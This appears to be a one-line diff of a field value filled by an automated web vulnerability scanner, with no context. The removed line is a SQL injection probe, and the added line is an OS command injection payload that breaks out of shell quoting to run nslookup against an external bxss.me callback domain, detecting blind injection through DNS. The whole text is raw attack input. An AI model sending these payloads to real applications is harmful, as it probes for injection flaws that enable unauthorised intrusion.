@@ -1,1 +1,1 @@
--1' OR 2+798-798-1=0+0+0+1 or 'gpT7YhLQ'='
+&nslookup -q=cname hittkrbppofiw6c4ff.bxss.me&'\"`0&nslookup -q=cname hittkrbppofiw6c4ff.bxss.me&`'
